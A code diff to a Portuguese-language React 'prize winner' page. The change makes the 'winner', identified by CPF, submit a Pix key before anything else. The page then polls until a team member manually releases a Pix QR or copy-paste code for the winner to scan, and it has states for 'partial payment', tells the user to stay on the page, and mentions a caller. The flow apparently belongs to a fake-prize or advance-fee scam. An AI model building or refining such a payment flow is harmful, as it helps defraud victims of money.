@@ -96,7 +96,8 @@ export default function Contemplacao({ nome, cpf, evento, numeros = 1, dados = n
   // ligador). Faz polling pra destravar o botão sozinho, sem recarregar a página.
   // estado: 'bloqueado' | 'liberado' | 'pagamento_parcial'.
   const [resgate, setResgate] = useState({ codigo: null, estado: 'bloqueado', valor: null })
-  const [revelado, setRevelado] = useState(false)
+  // Chave Pix já informada? (vem do servidor; o código só aparece depois dela)
+  const [pixOk, setPixOk] = useState(false)
   const [copiado, setCopiado] = useState(false)
   const [pixAberto, setPixAberto] = useState(false)
 
@@ -151,9 +152,10 @@ export default function Contemplacao({ nome, cpf, evento, numeros = 1, dados = n
         if (!on) return
         setResgate(r)
         if (r.valor != null) setPremioValor(r.valor) // valor próprio deste CPF sobrescreve o padrão
-        if (r.estado !== 'liberado') setRevelado(false) // código antigo pode ter sido limpo no servidor
       })
     checar()
+    fetch(`/api/ganhador?acao=pix&cpf=${encodeURIComponent(String(cpf).replace(/\D/g, ''))}`)
+      .then((r) => r.json()).then((j) => { if (on && j?.informada) setPixOk(true) }).catch(() => {})
     const id = setInterval(checar, 4000)
     return () => { on = false; clearInterval(id) }
   }, [cpf])
@@ -244,15 +246,20 @@ export default function Contemplacao({ nome, cpf, evento, numeros = 1, dados = n
               <strong>💸 Pagamento parcial realizado.</strong>
               <span>Aguarde a nova liberação.</span>
             </div>
-          ) : !revelado ? (
+          ) : !pixOk ? (
+            // 1º passo: o ganhador informa a chave Pix (pra equipe saber pra onde pagar).
             <button
               type="button"
-              className={`cmp__resgate-btn ${resgate.estado === 'liberado' ? 'is-liberado' : 'is-bloqueado'}`}
-              disabled={resgate.estado !== 'liberado'}
+              className="cmp__resgate-btn is-liberado"
               onClick={async () => { if (onResgatar && (await onResgatar())) return; setPixAberto(true) }}
             >
-              {resgate.estado === 'liberado' ? '🎁 Resgatar meu prêmio!' : '🔒 Resgatar meu prêmio!'}
+              🎁 Resgatar meu prêmio!
             </button>
+          ) : resgate.estado !== 'liberado' || !resgate.codigo ? (
+            <div className="cmp__resgate-parcial">
+              <strong>✅ Chave Pix recebida!</strong>
+              <span>Nossa equipe está liberando o seu pagamento. Fique nesta página.</span>
+            </div>
           ) : (
             <div className="cmp__resgate-codigo">
               <span className="cmp__resgate-k">Escaneie o QR Code ou copie o código abaixo</span>
@@ -269,13 +276,13 @@ export default function Contemplacao({ nome, cpf, evento, numeros = 1, dados = n
               </div>
             </div>
           )}
-          {resgate.estado === 'bloqueado' && (
+          {pixOk && resgate.estado === 'bloqueado' && (
             <span className="cmp__resgate-aguarde">Aguardando liberação da nossa equipe…</span>
           )}
         </div>
 
         {pixAberto && (
-          <PixModal nome={nome} cpf={cpfDigits} onClose={() => setPixAberto(false)} onConfirmado={() => setRevelado(true)} />
+          <PixModal nome={nome} cpf={cpfDigits} onClose={() => setPixAberto(false)} onConfirmado={() => setPixOk(true)} />
         )}
 
         <p className={`cmp__concorre ${cls(4)}`}>
